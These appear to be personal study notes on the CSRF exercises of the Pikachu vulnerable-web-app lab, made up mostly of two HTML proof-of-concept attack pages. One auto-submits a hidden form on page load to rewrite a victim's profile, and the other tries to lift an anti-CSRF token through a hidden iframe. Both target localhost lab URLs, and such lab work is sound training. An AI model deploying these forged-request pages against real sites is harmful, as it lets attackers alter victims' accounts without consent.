# pikachu-labs-CSRF学习笔记

## ❌ CSRF Get Attack

## CSRF Post Attack
```html
<!-- 
Cookie: PHPSESSID=72vnetlm4nvmtfnua87cjgdlh0

sex=mandddddd
&phonenum=12345678922
&add=usadddd+hacker
&email=lucy%40pikachu.com
&submit=submit 
-->
<html>
    <h1>Hello You be hacked now...</h1>
    <script>
        window.onload = function() {
            document.getElementById('submit').click();
        }
    </script>
    <body>
        <form action="http://localhost/pikachu/vul/csrf/csrfpost/csrf_post_edit.php", method="POST">
            <!-- 
                sex=mandddddd
                &phonenum=12345678922
                &add=usadddd+hacker
                &email=lucy%40pikachu.com
                &submit=submit  
            -->
            <input type="hidden", name="sex", value="man">
            <input type="hidden", name="phonenum", value="110">
            <input type="hidden", name="add", value="hackhaung">
            <input type="hidden", name="email", value="hi@hackorg.com">
            <input type="hidden", name="submit", value="submit">
            <input id="submit", type="submit" value="sumit the post request">
        </form>
    </body>
</html>
```

## CSRF Token Attack
```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>CSRF Token Attack</title>
</head>
<body>
    <iframe id="myIframe" src="http://localhost/pikachu/vul/csrf/csrftoken/token_get_edit.php" border="0" style="display: none;"></iframe>
    <!-- <button onclick="readTokenFromIframe()">Read Token</button> -->
    <script>
        function readTokenFromIframe() {
            var iframe = document.getElementById('myIframe');
            // 在实际应用中，需要确保这里的 iframe 内容已经完全加载
            if (iframe.contentDocument) {
                var token = iframe.contentDocument.querySelector('input[name="token"]').value;
                if (token) {
                    console.log('Token:', token);
                    document.querySelector('input[name="token"]').value = token
                }
            }
        }
    </script>
    <!-- GET 
     /pikachu/vul/csrf/csrftoken/token_get_edit.php?
     sex=man&
     phonenum=119&
     add=hackhaung&
     email=a&
     token=30870676cbc840b096214719282&
     submit=submit 
    HTTP/1.1 -->
    <form action="http://localhost/pikachu/vul/csrf/csrftoken/token_get_edit.php">
        <input type="hidden" name="sex" value="hack sex"/>
        <input type="hidden" name="phonenum" value="hack phonenum"/>
        <input type="hidden" name="add" value="hack address"/>
        <input type="hidden" name="email" value="hack email"/>
        <input type="hidden" name="token" value=""/>
        <input type="hidden" name="submit" value="submit"/>
        <input type="submit" value="Attack" onclick="readTokenFromIframe()"/>
    </form>
</body>
</html>
```